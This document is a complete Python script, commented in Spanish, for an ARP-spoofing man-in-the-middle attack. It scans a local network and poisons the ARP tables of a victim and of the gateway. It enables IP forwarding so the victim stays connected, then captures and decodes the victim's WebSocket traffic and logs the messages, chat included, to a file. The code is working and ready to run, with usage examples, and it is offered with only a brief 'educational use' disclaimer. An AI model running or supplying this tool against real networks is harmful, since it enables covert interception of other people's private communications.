#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time
import sys
import signal
import threading
import json
from typing import Dict, List, Optional

class ArpSpoofer:
    def __init__(self, interface: str):
        """Constructor for ArpSpoofer class."""
        self.interface = interface
        self.devices: Dict[str, str] = {}  # {ip: mac}
        self.spoofing_active = False
        self.original_tables = {}  # Para restaurar
        
        # CTRL+C
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        if self.spoofing_active:
            print("\n[!] Restaurando tablas ARP...")
            self._restore_all()
        print("[+] Saliendo...")
        sys.exit(0)
    
    def scan_network(self, ip_range: str, retries: int = 3, timeout: int = 5) -> Dict[str, str]:
        # Escaneo de la red por medio de mensajes ARP
        # Se almacenan en el diccionario de dispositivos
        # A mayor timeout de respuestas y numero de intentos, mayor confianza en el hallazgo

        print(f"[*] Escaneando red: {ip_range}")
        all_devices = {}
        
        for attempt in range(retries):
            if retries > 1:
                print(f"[*] Intento {attempt + 1}/{retries}...")
            
            # Crear y enviar ARP request broadcast
            arp_request = scapy.ARP(pdst=ip_range)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            answered_list = scapy.srp(
                arp_request_broadcast, 
                iface=self.interface, 
                timeout=timeout,
                verbose=False,
                retry=2
            )[0]
            
            # Procesar respuestas
            for sent, received in answered_list:
                ip = received.psrc
                mac = received.hwsrc
                if ip not in all_devices:
                    all_devices[ip] = mac
                    print(f"[+] Encontrado: {ip:15} -> {mac}")
            
        
        self.devices = all_devices

        # Detectar gateway
        try:
            gateway = scapy.conf.route.route("0.0.0.0")[2]
            if gateway and gateway != "0.0.0.0":
                print(f"\n[i] Gateway de la red: {gateway}")
                if gateway in all_devices:
                    print(f"[i] MAC del gateway: {all_devices[gateway]}")
        except:
            pass

        print(f"[+] Total dispositivos: {len(all_devices)}")
        return all_devices
    
    def get_mac(self, ip: str) -> Optional[str]:
        #MAC de una IP específica.
        if ip in self.devices:
            return self.devices[ip]
        
        print(f"[*] Obteniendo MAC de {ip}...")
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        answered_list = scapy.srp(
            arp_request_broadcast,
            iface=self.interface,
            timeout=3,
            verbose=False
        )[0]
        
        if answered_list:
            mac = answered_list[0][1].hwsrc
            self.devices[ip] = mac
            print(f"[+] {ip} -> {mac}")
            return mac
        else:
            print(f"[!] No se pudo obtener MAC de {ip}")
            return None
    
    def spoof_once(self, target_ip: str, gateway_ip: str) -> bool:
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            print("[!] No se pudieron obtener las MACs necesarias")
            return False

        # Estado original, para restaurar
        if target_ip not in self.original_tables:
            self.original_tables[target_ip] = {
                'gateway_ip': gateway_ip,
                'gateway_mac': gateway_mac,
                'target_mac': target_mac
            }

        own_mac = scapy.get_if_hwaddr(self.interface)
        
        # Actuar como gateway para la víctima
        packet_to_target = scapy.Ether(dst=target_mac) / scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=own_mac
        )
        
        # Actuar como la víctima para el gateway
        packet_to_gateway = scapy.Ether(dst=gateway_mac) / scapy.ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip,
            hwsrc=own_mac
        )
        
        # Enviar paquetes
        scapy.sendp(packet_to_target, iface=self.interface, verbose=False)
        scapy.sendp(packet_to_gateway, iface=self.interface, verbose=False)
        
        print(f"[+] Spoof ejecutado: {target_ip} <-> {gateway_ip}")
        self.spoofing_active = True
        return True
    
    def spoof_continuous(self, target_ip: str, gateway_ip: str, interval: float = 2):
        # Ejecuta ARP spoofing en loop continuo.
        # CTRL+C para detener y restaurar.

        print(f"[*] Iniciando spoofing continuo (CTRL+C para detener)...")
        print(f"[*] Target: {target_ip} | Gateway: {gateway_ip}")
        print(f"[*] Intervalo: {interval}s")
        
        try:
            sent_count = 0
            while True:
                self.spoof_once(target_ip, gateway_ip)
                sent_count += 2  # 2 paquetes por ciclo
                print(f"[*] Paquetes enviados: {sent_count}", end='\r')
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[!] Deteniendo spoofing...")
            self._restore_all()
    
    def restore(self, target_ip: str, gateway_ip: str, count: int = 5):
        # Restaura la tabla ARP de la víctima a su estado original

        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            print("[!] No se pueden restaurar: MACs no disponibles")
            return
        
        print(f"[*] Restaurando tablas ARP...")
        
        packet_to_target = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac
        )
        
        packet_to_gateway = scapy.ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac
        )
        
        # Enviar múltiples veces para asegurar
        for _ in range(count):
            scapy.sendp(packet_to_target, iface=self.interface, verbose=False)
            scapy.sendp(packet_to_gateway, iface=self.interface, verbose=False)
            time.sleep(0.5)
        
        print(f"[+] Tablas ARP restauradas")
    
    def _restore_all(self):
        """Restaura todas las tablas ARP envenenadas"""
        for target_ip, info in self.original_tables.items():
            self.restore(target_ip, info['gateway_ip'])
        self.spoofing_active = False
    
    def enable_ip_forwarding(self):
        # IP forwarding para que los paquetes del a victima no se detengan
        # Sin esto, perdería la conexión original
        # SOLO se usa con la flag --enable-forwarding
        
        import platform
        import subprocess
        
        system = platform.system()
        
        try:
            if system == "Linux":
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                             check=True, capture_output=True)
                print("[+] IP forwarding habilitado (Linux)")
            elif system == "Darwin":  # macOS
                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                             check=True, capture_output=True)
                print("[+] IP forwarding habilitado (macOS)")
            elif system == "Windows":
                print("[!] En Windows, habilita IP forwarding manualmente:")
                print("    Set-NetIPInterface -Forwarding Enabled")
            else:
                print(f"[!] Sistema {system} no soportado para auto-enable")
        except subprocess.CalledProcessError as e:
            print(f"[!] Error habilitando IP forwarding: {e}")
            print("[!] Ejecuta manualmente o el target perderá conexión")
    
    # ==================== WEBSOCKET CAPTURE ====================
    
    def _is_websocket_frame(self, data: bytes) -> bool:
        """Detecta si es un frame de WebSocket"""
        if len(data) < 2:
            return False
        
        # Primer byte: FIN + RSV + Opcode
        first_byte = data[0]
        opcode = first_byte & 0x0F
        
        # Opcodes válidos de WebSocket: 0x0-0x2, 0x8-0xA
        valid_opcodes = [0x0, 0x1, 0x2, 0x8, 0x9, 0xA]
        if opcode not in valid_opcodes:
            return False
        
        # Segundo byte: MASK + Payload length
        second_byte = data[1]
        payload_len = second_byte & 0x7F
        
        # Verificar longitud mínima según payload_len
        min_length = 2
        if payload_len == 126:
            min_length += 2
        elif payload_len == 127:
            min_length += 8
        
        # Si está enmascarado, +4 bytes para la key
        if second_byte & 0x80:
            min_length += 4
        
        return len(data) >= min_length
    
    def _parse_websocket_frame(self, data: bytes) -> Optional[dict]:
        """
        Parsea un frame de WebSocket y extrae el payload.
        Retorna dict con: opcode, payload, is_text
        """
        try:
            if len(data) < 2:
                return None
            
            # Byte 1: FIN + Opcode
            first_byte = data[0]
            fin = (first_byte & 0x80) >> 7
            opcode = first_byte & 0x0F
            
            # Byte 2: MASK + Payload Length
            second_byte = data[1]
            masked = (second_byte & 0x80) >> 7
            payload_len = second_byte & 0x7F
            
            # Posición actual en el buffer
            pos = 2
            
            # Obtener longitud extendida si es necesario
            if payload_len == 126:
                if len(data) < pos + 2:
                    return None
                payload_len = int.from_bytes(data[pos:pos+2], 'big')
                pos += 2
            elif payload_len == 127:
                if len(data) < pos + 8:
                    return None
                payload_len = int.from_bytes(data[pos:pos+8], 'big')
                pos += 8
            
            # Obtener masking key si está enmascarado
            masking_key = None
            if masked:
                if len(data) < pos + 4:
                    return None
                masking_key = data[pos:pos+4]
                pos += 4
            
            # Extraer payload
            if len(data) < pos + payload_len:
                return None  # Frame incompleto
            
            payload_data = data[pos:pos+payload_len]
            
            # Desenmascarar si es necesario
            if masked and masking_key:
                payload_data = bytes([
                    payload_data[i] ^ masking_key[i % 4]
                    for i in range(len(payload_data))
                ])
            
            # Intentar decodificar como texto si es opcode de texto
            decoded_payload = None
            if opcode == 0x1:  # Text frame
                try:
                    decoded_payload = payload_data.decode('utf-8')
                except:
                    decoded_payload = payload_data.hex()
            
            return {
                'fin': fin,
                'opcode': opcode,
                'opcode_name': self._get_opcode_name(opcode),
                'masked': masked,
                'payload_length': payload_len,
                'payload_raw': payload_data,
                'payload_text': decoded_payload
            }
            
        except Exception as e:
            # Silencioso para no spammear consola
            return None
    
    def _get_opcode_name(self, opcode: int) -> str:
        """Retorna el nombre del opcode"""
        opcodes = {
            0x0: 'continuation',
            0x1: 'text',
            0x2: 'binary',
            0x8: 'close',
            0x9: 'ping',
            0xA: 'pong'
        }
        return opcodes.get(opcode, f'unknown({hex(opcode)})')
    
    def _process_packet(self, packet, log_file=None):
        """Procesa paquetes capturados buscando WebSockets"""
        
        if not packet.haslayer(scapy.TCP):
            return
        
        if not packet.haslayer(scapy.Raw):
            return
        
        load = packet[scapy.Raw].load
        src_ip = packet[scapy.IP].src
        dst_ip = packet[scapy.IP].dst
        src_port = packet[scapy.TCP].sport
        dst_port = packet[scapy.TCP].dport
        
        # Detectar HTTP Upgrade a WebSocket
        if b"Upgrade: websocket" in load or b"Sec-WebSocket" in load:
            print(f"\n[WS-HANDSHAKE] {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
            if b"Sec-WebSocket-Key:" in load:
                print(f"[+] WebSocket connection iniciada")
            if log_file:
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                log_file.write(f"[{timestamp}] HANDSHAKE: {src_ip}:{src_port} -> {dst_ip}:{dst_port}\n")
                log_file.flush()
        
        # Intentar parsear como frame de WebSocket
        elif self._is_websocket_frame(load):
            frame = self._parse_websocket_frame(load)
            
            if frame and frame['opcode'] in [0x1, 0x2]:  # Text o binary
                timestamp = time.strftime("%H:%M:%S")
                print(f"\n[{timestamp}] WS Message ({src_ip}:{src_port} -> {dst_ip}:{dst_port})")
                print(f"    Opcode: {frame['opcode_name']}")
                print(f"    Length: {frame['payload_length']} bytes")
                
                if frame['payload_text']:
                    # Intentar parsear como JSON (común en chats)
                    try:
                        data = json.loads(frame['payload_text'])
                        print(f"    JSON: {json.dumps(data, indent=6, ensure_ascii=False)}")
                        
                        # Loguear JSON formateado
                        if log_file:
                            log_timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                            log_file.write(f"\n[{log_timestamp}] {src_ip}:{src_port} -> {dst_ip}:{dst_port}\n")
                            log_file.write(json.dumps(data, indent=2, ensure_ascii=False) + "\n")
                            log_file.flush()
                    except:
                        # Si no es JSON, mostrar texto plano
                        preview = frame['payload_text'][:200]
                        print(f"    Text: {preview}")
                        if len(frame['payload_text']) > 200:
                            print(f"    ... (+{len(frame['payload_text']) - 200} chars)")
                        
                        # Loguear texto completo
                        if log_file:
                            log_timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                            log_file.write(f"[{log_timestamp}] {src_ip}:{src_port} -> {dst_ip}:{dst_port}\n")
                            log_file.write(f"{frame['payload_text']}\n")
                            log_file.flush()
                elif frame['opcode'] == 0x2:  # Binary
                    print(f"    Binary: {len(frame['payload_raw'])} bytes")
                    if log_file:
                        log_timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                        log_file.write(f"[{log_timestamp}] BINARY: {len(frame['payload_raw'])} bytes\n")
                        log_file.flush()
    
    def _spoof_loop(self, target_ip: str, gateway_ip: str, interval: float = 2):
        """Loop de spoofing para ejecutar en thread"""
        sent_count = 0
        while True:
            self.spoof_once(target_ip, gateway_ip)
            sent_count += 2
            # Actualizar contador sin salto de línea
            print(f"[*] Paquetes ARP enviados: {sent_count}", end='\r')
            time.sleep(interval)
    
    def capture_websockets(self, target_ip: str, gateway_ip: str, 
                          output_file: Optional[str] = None,
                          interval: float = 2):
        """
        Captura WebSockets mientras hace spoofing.
        Opcionalmente guarda en archivo.
        """
        print(f"\n{'='*60}")
        print(f"  ARP Spoofer + WebSocket Capture")
        print(f"{'='*60}")
        print(f"[*] Target: {target_ip}")
        print(f"[*] Gateway: {gateway_ip}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Intervalo de spoof: {interval}s")
        if output_file:
            print(f"[*] Guardando en: {output_file}")
        print(f"[*] Presiona CTRL+C para detener y restaurar")
        print(f"{'='*60}\n")
        
        # Thread para spoofing continuo
        spoof_thread = threading.Thread(
            target=self._spoof_loop,
            args=(target_ip, gateway_ip, interval),
            daemon=True
        )
        spoof_thread.start()
        
        # Esperar un poco para que el spoofing se establezca
        time.sleep(2)
        print("[+] Spoofing activo, iniciando captura de paquetes...\n")
        
        # Archivo de salida opcional
        log_file = None
        if output_file:
            try:
                log_file = open(output_file, 'a', encoding='utf-8')
                log_file.write(f"\n{'='*60}\n")
                log_file.write(f"Captura iniciada: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                log_file.write(f"Target: {target_ip} | Gateway: {gateway_ip}\n")
                log_file.write(f"{'='*60}\n\n")
                log_file.flush()
            except Exception as e:
                print(f"[!] Error abriendo archivo: {e}")
                log_file = None
        
        # Captura de paquetes
        try:
            scapy.sniff(
                iface=self.interface,
                filter=f"host {target_ip} and tcp",
                prn=lambda pkt: self._process_packet(pkt, log_file),
                store=False
            )
        except KeyboardInterrupt:
            print("\n\n[!] Deteniendo captura...")
            if log_file:
                log_file.write(f"\n{'='*60}\n")
                log_file.write(f"Captura finalizada: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                log_file.write(f"{'='*60}\n")
                log_file.close()
                print(f"[+] Log guardado en: {output_file}")
            self._restore_all()


def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofer + WebSocket Capture - Herramienta MITM",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  # Escanear red
  %(prog)s -i wlan0 --scan 192.168.1.0/24
  
  # Spoof una vez y esperar
  %(prog)s -i wlan0 -t 192.168.1.100 -g 192.168.1.1 --once
  
  # Spoof continuo (CTRL+C para restaurar)
  %(prog)s -i wlan0 -t 192.168.1.100 -g 192.168.1.1
  
  # Capturar WebSockets (modo principal)
  %(prog)s -i wlan0 -t 192.168.1.100 -g 192.168.1.1 --capture-ws --enable-forwarding
  
  # Capturar y guardar en archivo
  %(prog)s -i wlan0 -t 192.168.1.100 -g 192.168.1.1 --capture-ws -o chat.log --enable-forwarding
  
  # Restaurar manualmente
  %(prog)s -i wlan0 -t 192.168.1.100 -g 192.168.1.1 --restore

IMPORTANTE: 
  - Usa --enable-forwarding para no cortar la conexión del target
  - Requiere permisos de root/sudo
  - Solo con fines educativos y en redes propias
        """
    )
    
    parser.add_argument("-i", "--interface", required=True,
                       help="Interfaz de red (ej: wlan0, eth0)")
    
    # Modos de operación
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--scan", metavar="RANGE",
                      help="Escanear red (ej: 192.168.1.0/24)")
    group.add_argument("--once", action="store_true",
                      help="Ejecutar spoof una vez y mantener (CTRL+C restaura)")
    group.add_argument("--restore", action="store_true",
                      help="Solo restaurar tablas ARP")
    group.add_argument("--capture-ws", action="store_true",
                      help="Capturar WebSockets del target (requiere -t y -g)")
    
    # Parámetros para spoofing
    parser.add_argument("-t", "--target",
                       help="IP del target (víctima)")
    parser.add_argument("-g", "--gateway",
                       help="IP del gateway (router)")
    parser.add_argument("--interval", type=float, default=2,
                       help="Intervalo entre paquetes en modo continuo (default: 2s)")
    parser.add_argument("--enable-forwarding", action="store_true",
                       help="Habilitar IP forwarding automáticamente")
    parser.add_argument("-o", "--output",
                       help="Archivo de salida para mensajes capturados")
    
    args = parser.parse_args()
    
    # Verificar permisos root
    import os
    if os.geteuid() != 0:
        print("[!] Este script requiere permisos de root/sudo")
        print("    Ejemplo: sudo python3 arp_spoof.py -i wlan0 --scan 192.168.1.0/24")
        sys.exit(1)
    
    spoofer = ArpSpoofer(interface=args.interface)
    
    # IP forwarding si se solicita
    if args.enable_forwarding:
        spoofer.enable_ip_forwarding()
    
    # Solo escanear
    if args.scan:
        spoofer.scan_network(args.scan)
        return
    
        # Captura de WebSockets
    if args.capture_ws:
        if not args.target or not args.gateway:
            parser.error("--capture-ws requiere -t/--target y -g/--gateway")
        
        if not args.enable_forwarding:
            print("\n[!] ADVERTENCIA: No se habilitó IP forwarding")
            print("[!] El target puede perder conectividad")
            print("[!] Usa --enable-forwarding para evitar esto\n")
            try:
                input("Presiona ENTER para continuar de todos modos (o CTRL+C para cancelar)...")
            except KeyboardInterrupt:
                print("\n[+] Cancelado")
                return
        
        spoofer.capture_websockets(args.target, args.gateway, args.output, args.interval)
        return
    
    # Validar target y gateway para el resto
    if not args.target or not args.gateway:
        parser.error("Se requieren -t/--target y -g/--gateway para spoofing/restore")
    
    # Solo restaurar
    if args.restore:
        spoofer.restore(args.target, args.gateway)
        return
    
    # Spoof una vez
    if args.once:
        if spoofer.spoof_once(args.target, args.gateway):
            print("[*] Spoof activo. CTRL+C para restaurar y salir.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Restaurando...")
                spoofer.restore(args.target, args.gateway)
        return
    
    # Spoof continuo (default)
    spoofer.spoof_continuous(args.target, args.gateway, interval=args.interval)


if __name__ == "__main__":
    main()
